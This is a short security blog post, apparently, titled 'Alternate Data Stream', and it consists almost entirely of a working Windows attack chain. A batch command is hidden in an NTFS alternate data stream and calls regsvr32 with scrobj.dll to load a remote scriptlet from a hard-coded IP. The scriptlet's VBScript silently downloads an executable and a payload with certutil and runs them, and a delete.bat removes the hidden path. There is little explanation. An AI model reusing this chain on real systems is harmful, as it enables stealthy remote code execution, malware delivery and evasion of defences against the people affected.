---
author: XhstormR
categories:
- security
date: 2019-09-30T19:31:07+08:00
title: Alternate Data Stream
---

<!--more-->

Updated on 2019-09-30

```bash
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:http://47.98.135.65/main/main.xml ^scrobj.dll > ...:payload.bat

cmd.exe - < ...:payload.bat
```

### main.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<scriptlet>
<registration classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
<script language="VBScript">
    <![CDATA[
        Set shell = CreateObject("WScript.Shell")
        shell.Run _
        "C:\Windows\System32\cmd.exe /c cd /d %TEMP% && " &_
        "certutil.exe -urlcache -split -f http://47.98.135.65/main/main.exe main.exe && " &_
        "certutil.exe -urlcache -split -f http://47.98.135.65/main/payload.txt payload.txt && " &_
        "main.exe", 0, false
    ]]>
</script>
</registration>
</scriptlet>
```

### delete.bat
```bash
del /f /a /q \\?\%1
rd /s /q \\?\%1
```
